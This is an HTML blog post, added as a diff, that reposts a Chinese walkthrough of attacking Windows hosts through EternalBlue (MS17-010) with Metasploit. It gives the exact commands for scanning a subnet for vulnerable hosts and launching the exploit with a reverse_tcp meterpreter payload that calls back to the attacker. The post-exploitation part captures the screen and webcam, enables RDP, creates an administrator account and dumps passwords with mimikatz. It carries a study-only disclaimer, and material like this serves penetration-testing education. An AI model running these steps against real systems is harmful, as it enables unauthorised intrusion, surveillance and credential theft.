@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>MSF框架实现&#34;永恒之蓝&#34;的攻击演示 | Echo&#39;s Blog | 在运维的道路上越走越远</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="网络安全,kali,MSF">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="仅供技术学习，遵守国家法律，切勿用于非法攻击！">
+<meta name="keywords" content="网络安全,kali,MSF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSF框架实现&quot;永恒之蓝&quot;的攻击演示">
+<meta property="og:url" content="http://www.deops.cn/posts/af5d3de9/index.html">
+<meta property="og:site_name" content="Echo&#39;s Blog">
+<meta property="og:description" content="仅供技术学习，遵守国家法律，切勿用于非法攻击！">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fy8q61as5fj30xa0fd15b.jpg">
+<meta property="og:image" content="https://wx4.sinaimg.cn/mw690/006ALkzYgy1fy8qdyn6rqj30us0iralj.jpg">
+<meta property="og:updated_time" content="2018-12-16T10:14:35.088Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MSF框架实现&quot;永恒之蓝&quot;的攻击演示">
+<meta name="twitter:description" content="仅供技术学习，遵守国家法律，切勿用于非法攻击！">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fy8q61as5fj30xa0fd15b.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="Echo&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.gif" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Echo</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/album"  >
+                    <i class="icon icon-lg icon-image"></i>
+                    <span>相 册</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="http://t.cn/RrDDg7q" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Marnm" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6040025614" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">MSF框架实现&#34;永恒之蓝&#34;的攻击演示</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#一、攻击简介"><span class="post-toc-number">1.</span> <span class="post-toc-text">一、攻击简介</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#二、工具准备"><span class="post-toc-number">2.</span> <span class="post-toc-text">二、工具准备</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x01-nmap环境准备"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">0x01 nmap环境准备</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x02-MSF环境准备"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">0x02 MSF环境准备</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x03-kali环境要求"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">0x03 kali环境要求</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#0x04-2-2-2-MSF攻击框架版本要求"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">0x04 2.2.2 MSF攻击框架版本要求</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#三、主机发现"><span class="post-toc-number">3.</span> <span class="post-toc-text">三、主机发现</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#fping"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">fping</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#nbtscan"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">nbtscan</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#nmap"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">nmap</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#四、漏洞扫面"><span class="post-toc-number">4.</span> <span class="post-toc-text">四、漏洞扫面</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#nmap漏洞扫面"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">nmap漏洞扫面</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#MSF-Auxiliary辅助扫面"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">MSF Auxiliary辅助扫面</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#五、漏洞利用"><span class="post-toc-number">5.</span> <span class="post-toc-text">五、漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#ms17-010-漏洞利用之MSF使用方法"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">ms17-010 漏洞利用之MSF使用方法</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#六、维持访问"><span class="post-toc-number">6.</span> <span class="post-toc-text">六、维持访问</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#理论-payload-攻击载荷理论"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">[理论]payload 攻击载荷理论</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#理论-single（独立载荷）"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">[理论]single（独立载荷）</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#理论-stagers（传输器载荷）"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">[理论]stagers（传输器载荷）</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#攻击载荷配置过程"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">攻击载荷配置过程</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#meterpreter功能展现"><span class="post-toc-number">6.5.</span> <span class="post-toc-text">meterpreter功能展现</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#桌面抓图"><span class="post-toc-number">6.5.1.</span> <span class="post-toc-text">桌面抓图</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#视频开启"><span class="post-toc-number">6.5.2.</span> <span class="post-toc-text">视频开启</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#开启远程桌面"><span class="post-toc-number">6.5.3.</span> <span class="post-toc-text">开启远程桌面</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#添加管理员账号"><span class="post-toc-number">6.5.4.</span> <span class="post-toc-text">添加管理员账号</span></a></li></ol></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#获取系统管理员密码"><span class="post-toc-number">6.6.</span> <span class="post-toc-text">获取系统管理员密码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#kali远程连接Windows"><span class="post-toc-number">6.6.1.</span> <span class="post-toc-text">kali远程连接Windows</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-MSF框架实现ms17-010的攻击演示"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">MSF框架实现"永恒之蓝"的攻击演示</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2018-12-16 16:39:58" datetime="2018-12-16T08:39:58.000Z"  itemprop="datePublished">2018-12-16</time>
+
+            <br id="mybreak"/>
+            
+<script>
+	mybreak.style="display:none";
+</script>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">7</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p><strong>仅供技术学习，遵守国家法律，切勿用于非法攻击！</strong><br><a id="more"></a></p>
+<p>作者：myles007<br>原文:<a href="https://www.anquanke.com/post/id/86245" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86245</a></p>
+<h4 id="一、攻击简介"><a href="#一、攻击简介" class="headerlink" title="一、攻击简介"></a>一、攻击简介</h4><p>其实我们这里所说的使用MSF 实现 “永恒之蓝”的快速攻击，就是<strong>利用Metasploit中近期更新的针对ms17-101漏洞的攻击载荷进行攻击获取主机控制权限。我这里简单的记录下整个攻击利用所需要的工具准备、利用过程以及后渗透的一些简单内容。</strong></p>
+<h4 id="二、工具准备"><a href="#二、工具准备" class="headerlink" title="二、工具准备"></a>二、工具准备</h4><h5 id="0x01-nmap环境准备"><a href="#0x01-nmap环境准备" class="headerlink" title="0x01 nmap环境准备"></a>0x01 nmap环境准备</h5><p>（1）请将Nmap安装到当前最新版本(7.40以上)；<br>（2）确保 script脚本中包含smb-vuln-ms17-010.nse脚本；<br>在后面扫描检测是需要用到此脚本进行漏洞扫描检查，有关script脚本的存放位置在Nmap安装根目录下的有个“script”目录，直接进入搜索“ms17-010”，存在则无需再下载。 </p>
+<p>（3）相关软件下载<br>nmap下载地址：<a href="https://nmap.org/download.html" target="_blank" rel="noopener">https://nmap.org/download.html</a><br>smb-vuln-ms17-010.nse下载地址：<a href="https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html</a> </p>
+<h5 id="0x02-MSF环境准备"><a href="#0x02-MSF环境准备" class="headerlink" title="0x02 MSF环境准备"></a>0x02 MSF环境准备</h5><p>metasploit 其默认在kali中就自带有整个攻击框架，后续我们对我们简称其为MSF框架。因为我们要用到针对“永恒之蓝”漏洞的攻击，故需要将MSF框架升级到最新版本，至少在4.14.17版本以上。</p>
+<h5 id="0x03-kali环境要求"><a href="#0x03-kali环境要求" class="headerlink" title="0x03 kali环境要求"></a>0x03 kali环境要求</h5><p>建议大家直接使用kali2.0的环境，这样后续进行MSF框架的升级也比较方便，不容易出现各种未知的问题，方面我们后续渗透攻击的展开。<br>（1） 编辑 kali 更新源<br>首先我配置kali的更新源：直接编辑更新源的配置文件“/etc/apt/sources.list” ,然后将下面的源复制进去保存即可。<br>（2）更新 kali系统<br>kali 源更新完后，我们进kali 内核的更新，具体更方法如下。</p>
+<blockquote>
+<p>root@kali:apt-get install linux-headers-$(uname -r)<br>#注：如果报错了的话可以输入这个试试<br>aptitude -r install linux-headers-$(uname -r)</p>
+</blockquote>
+<h5 id="0x04-2-2-2-MSF攻击框架版本要求"><a href="#0x04-2-2-2-MSF攻击框架版本要求" class="headerlink" title="0x04 2.2.2 MSF攻击框架版本要求"></a>0x04 2.2.2 MSF攻击框架版本要求</h5><p>MSF框架版本要求在 4.11.17版本以上</p>
+<h4 id="三、主机发现"><a href="#三、主机发现" class="headerlink" title="三、主机发现"></a>三、主机发现</h4><p>对于主机的发现，我们可以使用的方法很多，这里简单记录和说明几种，供大家共同学习，每个人可根据主机的喜欢选择使用。</p>
+<h5 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h5><p>在kali系统中自带有fping这个扫描工具，有关于主机发现的扫描命令如下。</p>
+<blockquote>
+<p>fping -asg 192.168.1.0/24</p>
+</blockquote>
+<h5 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h5><blockquote>
+<p>nbtscan -r 192.168.1.0/24</p>
+</blockquote>
+<h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>关于namp 主机发现与扫描功能的强大，我们这里简单了记录几种个人常用的扫描方法。<br>（1） ping 包扫描</p>
+<blockquote>
+<p>nmap -n -sS 192.168.1.0/24<br>（2） 指定端口发现扫描<br>nmap -n -p445 192..168.1.0/24<br>（3） 针对漏洞脚本的定向扫描<br>nmap -n -p445 –script smb-vuln-ms17-010 192.168.1.0/24 –open</p>
+</blockquote>
+<h4 id="四、漏洞扫面"><a href="#四、漏洞扫面" class="headerlink" title="四、漏洞扫面"></a>四、漏洞扫面</h4><p>在确定目标范围中那些主机是存活后，我们可以进行定向445端口的漏洞脚本扫描了，直接找到存在漏洞的目标主机，为后续的MSF攻击提供目标。 </p>
+<p>其实说到这里，大家会发现上面第三章节“主机发现”这一步，我们可以直接跳过，直接进定向445共享端口的漏洞扫描，上面之所以写出了，也是为了自己以后的学习和使用做一个笔记和记录。</p>
+<h5 id="nmap漏洞扫面"><a href="#nmap漏洞扫面" class="headerlink" title="nmap漏洞扫面"></a>nmap漏洞扫面</h5><p>MS17-101漏洞定向扫描命令如下：</p>
+<blockquote>
+<p>nmap -n -p445 –script smb-vuln-ms17-010 192.168.1.0/24 –open</p>
+</blockquote>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fy8q61as5fj30xa0fd15b.jpg" alt="通过namp的445端口定向漏洞扫描发现192.168.23.42存在漏洞" title="">
+                </div>
+                <div class="image-caption">通过namp的445端口定向漏洞扫描发现192.168.23.42存在漏洞</div>
+            </figure>
+<h5 id="MSF-Auxiliary辅助扫面"><a href="#MSF-Auxiliary辅助扫面" class="headerlink" title="MSF Auxiliary辅助扫面"></a>MSF Auxiliary辅助扫面</h5><p>我们也可以直接使用MSF框架的辅助模块“”auxiliary”中的扫描模块进行扫描。了解MSF的同学肯定都知道，MSF的扫描模块基本也就是调用nmap扫描来实现的。<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx4.sinaimg.cn/mw690/006ALkzYgy1fy8qdyn6rqj30us0iralj.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure></p>
+<blockquote>
+<p>msfconsole # 进入MSF框架<br>version # 确认下MSF的版本<br>search ms17_010 # 查找漏洞模块的具体路径<br>use auxiliary/scanner/smb/smb_ms17_010 # 调用漏洞扫描模块<br>show option # 查看模块配置选项<br>set RHOST 192.168.1.1-254 # 配置扫描目标<br>set THREADS 30 #配置扫描线程<br>run #运行脚本</p>
+</blockquote>
+<p>这个使用下来，我们发现其实还没有namp 一条命令就搞定了，来的方便。</p>
+<h4 id="五、漏洞利用"><a href="#五、漏洞利用" class="headerlink" title="五、漏洞利用"></a>五、漏洞利用</h4><p>通过以上所有环境的准备和漏洞扫描主机的发现，接下来使用MSF框架进行MS17-10漏洞的攻击，也就是“几秒”中的事情了，具体使用方法和过程记录如下。</p>
+<h5 id="ms17-010-漏洞利用之MSF使用方法"><a href="#ms17-010-漏洞利用之MSF使用方法" class="headerlink" title="ms17-010 漏洞利用之MSF使用方法"></a>ms17-010 漏洞利用之MSF使用方法</h5><blockquote>
+<p>msfconsole # 进入MSF 框架<br>version # 确保MSF框架版本在 4.14.17以上；<br>search ms17_010 # 漏洞模块路径查询<br>set exploit/windows/smb/ms17_010_eternalblue # 调用攻击模块<br>set RHOST 192.168.1.112 # 设定攻击目标<br>exploit # 发起攻击</p>
+</blockquote>
+<h4 id="六、维持访问"><a href="#六、维持访问" class="headerlink" title="六、维持访问"></a>六、维持访问</h4><p>这里的说到维持访问，主要是想记录下关于使用<code>meterpreter</code>这个攻击载荷模块，我们在利用漏洞的过程中，如果可以使用<code>meterpreter</code>攻击载荷模块，尽量使用这个模块。</p>
+<h5 id="理论-payload-攻击载荷理论"><a href="#理论-payload-攻击载荷理论" class="headerlink" title="[理论]payload 攻击载荷理论"></a>[理论]payload 攻击载荷理论</h5><p>说到这里就就普及下MSF框架下关于“payload”攻击载荷的基本概念，那么什么是payload呢？<br>payload又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，并返回一个shell，也可以进行程序注入等，payload有3种类型。 </p>
+<h5 id="理论-single（独立载荷）"><a href="#理论-single（独立载荷）" class="headerlink" title="[理论]single（独立载荷）"></a>[理论]single（独立载荷）</h5><p>从这个英文单词single,就可以大概知道这类payload是个独立，单独的意思，其实在结合定义我们就可以看出，攻击载荷一般做两件事情<br>一、就是建立目标主机与攻击主机之间的网络连接；<br>二、就是在连接建立的基础上获取目标主机的控制权限，即获取可供操作的shell。</p>
+<h5 id="理论-stagers（传输器载荷）"><a href="#理论-stagers（传输器载荷）" class="headerlink" title="[理论]stagers（传输器载荷）"></a>[理论]stagers（传输器载荷）</h5><p>在理解了一个完整的payload是有两部分组成的基础上，我们可以理解我们这里所说的结合体了，其实就是将原本的single独立体分割为了两个部分：“传输器载荷”与“传输体载荷”（stages &amp; stagers）<br>比如“windows/meterpreter/reverse_tcp”是由一个传输器载荷（reverse_tcp）和一个传输体载荷（meterpreter）所组成的，其功能等价于独立攻击载荷“windows/shell_reverse_tcp”</p>
+<h5 id="攻击载荷配置过程"><a href="#攻击载荷配置过程" class="headerlink" title="攻击载荷配置过程"></a>攻击载荷配置过程</h5><p>调用exploit攻击</p>
+<blockquote>
+<p>use exploit/windows/smb/ms17_010_eternalblue<br>set rhost 192.168.1.112</p>
+</blockquote>
+<p>配置攻击载荷</p>
+<blockquote>
+<p>set payload windows/x64/meterpreter/reverse_tcp<br>set lhost 192.168.1.22</p>
+</blockquote>
+<p>发起攻击</p>
+<blockquote>
+<p>exploit</p>
+</blockquote>
+<p>获取shell</p>
+<blockquote>
+<p>getuid</p>
+</blockquote>
+<h5 id="meterpreter功能展现"><a href="#meterpreter功能展现" class="headerlink" title="meterpreter功能展现"></a>meterpreter功能展现</h5><h6 id="桌面抓图"><a href="#桌面抓图" class="headerlink" title="桌面抓图"></a>桌面抓图</h6><blockquote>
+<p>meterpreter&gt; screenshot</p>
+</blockquote>
+<h6 id="视频开启"><a href="#视频开启" class="headerlink" title="视频开启"></a>视频开启</h6><blockquote>
+<p>meterpreter&gt; webcam_scream</p>
+</blockquote>
+<h6 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h6><blockquote>
+<p>meterpreter&gt; run post/windows/manage/enable_rdp</p>
+</blockquote>
+<h6 id="添加管理员账号"><a href="#添加管理员账号" class="headerlink" title="添加管理员账号"></a>添加管理员账号</h6><blockquote>
+<p>shell<br>net user test 123456 /add<br>net localgroup Administrators test /add</p>
+</blockquote>
+<p>… # 一直没有回显，怀疑是由于安装了360导致的，后来进过验证的确是这原因，所有说安装个360还是很有用的，不要总是说人家是流氓软件，不是打广告哈,切实感受…</p>
+<h5 id="获取系统管理员密码"><a href="#获取系统管理员密码" class="headerlink" title="获取系统管理员密码"></a>获取系统管理员密码</h5><p>想直接添加账号进行提权，前面操作是不了，那么我们现在就出杀手锏，直接使用mimikatz来获取系统管理账号的密码。 </p>
+<p>第一步：载入mimikatz</p>
+<blockquote>
+<p>meterpreter&gt; load mimikatz<br>meterpreter&gt; wdigest</p>
+</blockquote>
+<h6 id="kali远程连接Windows"><a href="#kali远程连接Windows" class="headerlink" title="kali远程连接Windows"></a>kali远程连接Windows</h6><blockquote>
+<p>root# rdesktop 192.168.1.22 -u user -p passw0rd</p>
+</blockquote>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新：<time datetime="2018-12-16T10:14:35.088Z" itemprop="dateUpdated">2018-12-16 18:14:35</time>
+</span>
+
+
+        
+    </div>
+    <footer>
+        <div onclick="location.href='http://www.deops.cn'">
+            <img src="/img/avatar.gif" alt="Echo">
+            <a>Echo</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MSF/">MSF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/">kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.deops.cn/posts/af5d3de9/&title=《MSF框架实现"永恒之蓝"的攻击演示》 — Echo's Blog&pic=http://www.deops.cn/img/avatar.gif" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.deops.cn/posts/af5d3de9/&title=《MSF框架实现"永恒之蓝"的攻击演示》 — Echo's Blog&source=仅供技术学习，遵守国家法律，切勿用于非法攻击！" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.deops.cn/posts/af5d3de9/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《MSF框架实现"永恒之蓝"的攻击演示》 — Echo's Blog&url=http://www.deops.cn/posts/af5d3de9/&via=http://www.deops.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.deops.cn/posts/af5d3de9/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/b1114d7a/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：kali工具Metasploit首次启动配置
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/2468d0a2/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：RFID安全之关于某校水卡的破解">下一篇：RFID安全之关于某校水卡的破解</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heartbeat"></i>
+            <a href="http://www.deops.cn">Echo</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <!--<span class="license"><a  target="_blank" rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">博客内容遵循 知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>-->
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.deops.cn/posts/af5d3de9/&title=《MSF框架实现"永恒之蓝"的攻击演示》 — Echo's Blog&pic=http://www.deops.cn/img/avatar.gif" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.deops.cn/posts/af5d3de9/&title=《MSF框架实现"永恒之蓝"的攻击演示》 — Echo's Blog&source=仅供技术学习，遵守国家法律，切勿用于非法攻击！" data-title=" QQ">
+          <i class="icon icon-qq"></i>
